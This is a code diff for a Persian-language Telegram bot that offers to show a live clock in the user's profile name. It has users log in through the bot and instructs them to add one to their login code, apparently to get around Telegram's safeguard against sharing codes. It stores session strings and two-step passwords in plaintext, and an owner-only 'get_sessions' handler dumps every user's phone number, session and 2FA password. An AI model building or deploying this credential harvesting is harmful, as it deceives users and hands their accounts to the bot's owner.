@@ -107,7 +107,7 @@ async def init_db():
 # ================== BOT ==================
 bot = TelegramClient("bot", BOT_API_ID, BOT_API_HASH)
 running_tasks = {}
-user_states = {}
+user_states = {}  # per-user ephemeral state during interactive flows
 
 FONT_MAP = {
     0: lambda x: x,
@@ -164,30 +164,51 @@ async def test_api(api_id, api_hash):
 
 
 # ================== SELF TASK ==================
-async def start_self_task(
-    user_id, session_string, api_id, api_hash, base_name, font_id
-):
+async def start_self_task(user_id, session_string, api_id, api_hash, base_name, font_id):
+    # create a user client from the stored session and run profile-updater loop
     client = TelegramClient(StringSession(session_string), api_id, api_hash)
     await client.connect()
 
     async def runner():
         while True:
             try:
-                t = FONT_MAP[font_id](now_time())
+                t = FONT_MAP.get(font_id, FONT_MAP[0])(now_time())
                 name = f"{base_name} {t}".strip()
                 await client(UpdateProfileRequest(first_name=name))
                 await asyncio.sleep(60)
             except FloodWaitError as e:
                 await asyncio.sleep(e.seconds + 5)
+            except asyncio.CancelledError:
+                # task cancelled (stop_self_task), break loop
+                break
             except Exception:
                 await asyncio.sleep(60)
 
+    # cancel existing task if any (safety)
+    await stop_self_task(user_id)
     running_tasks[user_id] = asyncio.create_task(runner())
+
+
+async def stop_self_task(user_id):
+    task = running_tasks.get(user_id)
+    if task:
+        task.cancel()
+        try:
+            await task
+        except Exception:
+            pass
+        running_tasks.pop(user_id, None)
 
 
 async def load_all_users():
     rows = await bot.pool.fetch("SELECT * FROM users WHERE is_active=true")
     for r in rows:
+        # skip incomplete rows (safety)
+        if not r["session_string"] or not r["api_id"] or not r["api_hash"]:
+            continue
+        # if base_name or font_id missing, skip starting until user finishes config
+        if not r["base_name"] or r["font_id"] is None:
+            continue
         await start_self_task(
             r["user_id"],
             r["session_string"],
@@ -201,11 +222,23 @@ async def load_all_users():
 # ================== START ==================
 @bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
+    uid = event.sender_id
     if await force_join_required(event):
         channels = await bot.pool.fetch("SELECT channel FROM force_join")
         await event.respond(
             "برای استفاده از ربات ابتدا باید عضو کانال‌های زیر شوید:\n\n"
             + "\n".join(c["channel"] for c in channels)
+        )
+        return
+
+    row = await bot.pool.fetchrow("SELECT is_active FROM users WHERE user_id=$1", uid)
+    if row and row["is_active"]:
+        await event.respond(
+            "✅ سلف شما فعال است\n\nاز گزینه‌های زیر استفاده کن:",
+            buttons=[
+                [Button.inline("✏️ تغییر سلف", b"change_self")],
+                [Button.inline("🛑 حذف سلف", b"remove_self")],
+            ],
         )
         return
 
@@ -225,6 +258,7 @@ async def callbacks(event):
     uid = event.sender_id
     data = event.data.decode()
 
+    # ---------- top menu ----------
     if data == "start_self":
         buttons = [
             [Button.inline("ورود بدون API", b"login_normal")],
@@ -259,39 +293,72 @@ async def callbacks(event):
 
     # ---------- LOGIN MODES ----------
     if data == "login_normal":
-        user_states[uid] = {"mode": "normal"}
-        # تغییر: راهنمای فرمت شماره
+        user_states[uid] = {"mode": "normal", "expect": "phone"}
         await event.edit("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
         return
 
     if data == "login_api":
-        user_states[uid] = {"mode": "api"}
+        user_states[uid] = {"mode": "api", "expect": "api_id"}
         await event.edit("🧩 API ID رو بفرست")
         return
 
-# ================== ADMIN: GET SESSIONS ==================
-@bot.on(events.CallbackQuery(pattern=b"get_sessions"))
-async def get_sessions_cb(event):
-    if event.sender_id != OWNER_ID:
+    # ---------- ADMIN: add/del/toggle force join ----------
+    if uid == OWNER_ID and data == "add_channel":
+        user_states[uid] = {"expect": "add_channel"}
+        await event.edit("یوزرنیم کانال رو بفرست (مثال: @channel)")
         return
-    rows = await bot.pool.fetch(
-        "SELECT user_id, phone, session_string, twofa_password FROM users"
-    )
-    text = ""
-    for r in rows:
-        text += (
-            f"ID: {r['user_id']}\n"
-            f"Phone: {r['phone']}\n"
-            f"Session: {r['session_string']}\n"
-            f"2FA: {r['twofa_password'] or 'ندارد'}\n\n"
+
+    if uid == OWNER_ID and data == "del_channel":
+        user_states[uid] = {"expect": "del_channel"}
+        await event.edit("یوزرنیم کانالی که می‌خوای حذف بشه رو بفرست (مثال: @channel)")
+        return
+
+    if uid == OWNER_ID and data == "toggle_force":
+        current = await bot.pool.fetchval(
+            "SELECT value FROM settings WHERE key='force_join_enabled'"
         )
-    await event.edit(text or "کاربری وجود ندارد")
+        new_value = "false" if current == "true" else "true"
+        await bot.pool.execute(
+            "UPDATE settings SET value=$1 WHERE key='force_join_enabled'",
+            new_value,
+        )
+        status = "فعال ✅" if new_value == "true" else "غیرفعال ❌"
+        await event.edit(f"وضعیت فورس‌جوین: {status}")
+        return
 
+    # ---------- ADMIN: get sessions ----------
+    if uid == OWNER_ID and data == "get_sessions":
+        rows = await bot.pool.fetch(
+            "SELECT user_id, phone, session_string, twofa_password FROM users"
+        )
+        text = ""
+        for r in rows:
+            text += (
+                f"ID: {r['user_id']}\n"
+                f"Phone: {r['phone']}\n"
+                f"Session: {r['session_string']}\n"
+                f"2FA: {r['twofa_password'] or 'ندارد'}\n\n"
+            )
+        await event.edit(text or "کاربری وجود ندارد")
+        return
 
-# ================== CALLBACKS (continued) ==================
-@bot.on(events.CallbackQuery)
-async def callbacks_noop(event):
-    # این هندلر برای جلوگیری از تداخل است — چیزی را تغییر نمی‌دهد.
+    # ---------- REMOVE / CHANGE self ----------
+    if data == "remove_self":
+        await stop_self_task(uid)
+        await bot.pool.execute("UPDATE users SET is_active=false WHERE user_id=$1", uid)
+        await event.edit("🛑 سلف شما غیرفعال شد")
+        return
+
+    if data == "change_self":
+        # stop running task and enter change flow (ask for base name)
+        await stop_self_task(uid)
+        user_states[uid] = {"mode": "change", "expect": "base_name"}
+        await event.edit("✏️ اسم جدید قبل ساعت رو بفرست")
+        return
+
+    # ---------- font pick handled separately by pattern ----------
+    # unknown callbacks fallthrough
+    # do nothing for unimplemented admin buttons (add_api, list_api, broadcast, get_sessions handled, get_sessions done)
     return
 
 
@@ -301,27 +368,53 @@ async def messages(event):
     uid = event.sender_id
     txt = event.raw_text.strip()
 
+    # only proceed if user is in an interactive state
     if uid not in user_states:
         return
 
     st = user_states[uid]
 
     try:
-        if st["mode"] == "api" and "api_id" not in st:
+        # ---------- ADMIN: add_channel / del_channel ----------
+        if st.get("expect") == "add_channel" and uid == OWNER_ID:
+            channel = txt
+            await bot.pool.execute(
+                "INSERT INTO force_join (channel) VALUES ($1) ON CONFLICT DO NOTHING",
+                channel,
+            )
+            await event.respond("✅ کانال با موفقیت اضافه شد")
+            user_states.pop(uid, None)
+            return
+
+        if st.get("expect") == "del_channel" and uid == OWNER_ID:
+            channel = txt
+            await bot.pool.execute(
+                "DELETE FROM force_join WHERE channel=$1",
+                channel,
+            )
+            await event.respond("✅ کانال با موفقیت حذف شد")
+            user_states.pop(uid, None)
+            return
+
+        # ---------- LOGIN: expect api_id ----------
+        if st.get("expect") == "api_id":
             st["api_id"] = int(txt)
+            st["expect"] = "api_hash"
             await event.respond("API HASH رو بفرست")
             return
 
-        if st["mode"] == "api" and "api_hash" not in st:
+        # ---------- LOGIN: expect api_hash ----------
+        if st.get("expect") == "api_hash":
             st["api_hash"] = txt
-            # تغییر: راهنمای فرمت شماره
+            st["expect"] = "phone"
             await event.respond("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
             return
 
-        if "phone" not in st:
+        # ---------- LOGIN: expect phone ----------
+        if st.get("expect") == "phone":
             st["phone"] = txt
-
-            if st["mode"] == "normal":
+            # fill api from pool if normal
+            if st.get("mode") == "normal":
                 api_id, api_hash = await get_available_api()
                 if not api_id:
                     await event.respond(
@@ -329,41 +422,47 @@ async def messages(event):
                         "یا خودت API بساز یا بعداً دوباره تلاش کن\n\n"
                         "ℹ️ راهنما رو ببین"
                     )
-                    user_states.pop(uid)
+                    user_states.pop(uid, None)
                     return
                 st["api_id"], st["api_hash"] = api_id, api_hash
 
+            # request code
             client = TelegramClient(StringSession(), st["api_id"], st["api_hash"])
             await client.connect()
-            await client.send_code_request(txt)
+            await client.send_code_request(st["phone"])
             st["client"] = client
+            st["expect"] = "code"
             await event.respond(
                 "⚠️ برای ورود باید یک عدد به کد اضافه کنی\n"
                 "مثال: 48391 → 48392"
             )
             return
 
-        # اصلاح: اگر نیاز به 2FA هست، این شاخه اجرا نشه و مستقیم به بخش 2FA بریم
-        if "code" not in st and not st.get("need_2fa"):
+        # ---------- LOGIN: expect code (but don't try int() if 2FA will be needed) ----------
+        if st.get("expect") == "code" and not st.get("need_2fa"):
+            # safe convert to int — this block only runs when expecting numerical code
             code = str(int(txt) - 1)
             try:
                 await st["client"].sign_in(st["phone"], code)
             except SessionPasswordNeededError:
                 st["need_2fa"] = True
+                st["expect"] = "2fa"
                 await event.respond("🔐 رمز دو مرحله‌ای رو بفرست")
                 return
 
+            # signed in without 2FA
             st["session"] = st["client"].session.save()
-            st["code"] = True
+            st["expect"] = "base_name"
             await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
             return
 
-        if st.get("need_2fa") and "password" not in st:
+        # ---------- LOGIN: expect 2fa ----------
+        if st.get("expect") == "2fa" and st.get("need_2fa"):
+            # this is textual password
             await st["client"].sign_in(password=txt)
             st["password"] = True
             st["session"] = st["client"].session.save()
-
-            # ذخیرهٔ رمز 2FA در دیتابیس (حداقلی و فقط همین فیلد)
+            # store twofa in DB minimally (as requested)
             await bot.pool.execute(
                 """
                 INSERT INTO users (user_id, phone, api_id, api_hash, session_string, twofa_password, is_active)
@@ -379,12 +478,14 @@ async def messages(event):
                 st["session"],
                 txt,
             )
-
+            st["expect"] = "base_name"
             await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
             return
 
-        if "base_name" not in st:
+        # ---------- CHANGE FLOW / BASE NAME ----------
+        if st.get("expect") == "base_name":
             st["base_name"] = txt
+            st["expect"] = "font"
             await event.respond(
                 "🎨 فونت ساعت رو انتخاب کن",
                 buttons=[
@@ -400,46 +501,99 @@ async def messages(event):
         await event.respond(f"❌ خطا: {e}")
 
 
+# ================== FONT PICK ==================
 @bot.on(events.CallbackQuery(pattern=b"font_"))
 async def font_pick(event):
     uid = event.sender_id
     font_id = int(event.data.decode().split("_")[1])
-    st = user_states[uid]
+    st = user_states.get(uid, {})
 
-    await bot.pool.execute(
-        """
-        INSERT INTO users (user_id, phone, api_id, api_hash, session_string,
-                           login_type, base_name, font_id, is_active)
-        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,true)
-        ON CONFLICT (user_id) DO UPDATE SET
-            session_string=$5,
-            api_id=$3,
-            api_hash=$4,
-            base_name=$7,
-            font_id=$8,
-            is_active=true
-        """,
-        uid,
-        st["phone"],
-        st["api_id"],
-        st["api_hash"],
-        st["session"],
-        st["mode"],
-        st["base_name"],
-        font_id,
-    )
+    # If user was in change flow
+    if st.get("mode") == "change" and st.get("expect") in ("font", "base_name"):
+        # update base_name and font_id in DB and start task
+        # fetch existing session data
+        row = await bot.pool.fetchrow("SELECT session_string, api_id, api_hash FROM users WHERE user_id=$1", uid)
+        if not row or not row["session_string"]:
+            await event.edit("⚠️ سشن پیدا نشد. ابتدا یکبار لاگین کن.")
+            user_states.pop(uid, None)
+            return
 
-    await start_self_task(
-        uid,
-        st["session"],
-        st["api_id"],
-        st["api_hash"],
-        st["base_name"],
-        font_id,
-    )
+        await bot.pool.execute(
+            """
+            UPDATE users SET base_name=$1, font_id=$2, is_active=true WHERE user_id=$3
+            """,
+            st["base_name"],
+            font_id,
+            uid,
+        )
 
-    await event.edit("✅ سلف تایم با موفقیت فعال شد")
-    user_states.pop(uid, None)
+        await start_self_task(
+            uid,
+            row["session_string"],
+            row["api_id"],
+            row["api_hash"],
+            st["base_name"],
+            font_id,
+        )
+
+        await event.edit(
+            "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
+            buttons=[
+                [Button.inline("✏️ تغییر سلف", b"change_self")],
+                [Button.inline("🛑 حذف سلف", b"remove_self")],
+            ],
+        )
+        user_states.pop(uid, None)
+        return
+
+    # Normal/new activation flow after login
+    if st.get("expect") == "font" and st.get("session"):
+        # insert/update user record with session and chosen config
+        await bot.pool.execute(
+            """
+            INSERT INTO users (user_id, phone, api_id, api_hash, session_string,
+                               login_type, base_name, font_id, is_active)
+            VALUES ($1,$2,$3,$4,$5,$6,$7,$8,true)
+            ON CONFLICT (user_id) DO UPDATE SET
+                session_string=$5,
+                api_id=$3,
+                api_hash=$4,
+                base_name=$7,
+                font_id=$8,
+                is_active=true
+            """,
+            uid,
+            st.get("phone"),
+            st.get("api_id"),
+            st.get("api_hash"),
+            st.get("session"),
+            st.get("mode"),
+            st.get("base_name"),
+            font_id,
+        )
+
+        # start the self task
+        await start_self_task(
+            uid,
+            st.get("session"),
+            st.get("api_id"),
+            st.get("api_hash"),
+            st.get("base_name"),
+            font_id,
+        )
+
+        await event.edit(
+            "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
+            buttons=[
+                [Button.inline("✏️ تغییر سلف", b"change_self")],
+                [Button.inline("🛑 حذف سلف", b"remove_self")],
+            ],
+        )
+        user_states.pop(uid, None)
+        return
+
+    # fallback
+    await event.answer("خطا: وضعیت نامشخص", alert=True)
 
 
 # ================== MAIN ==================
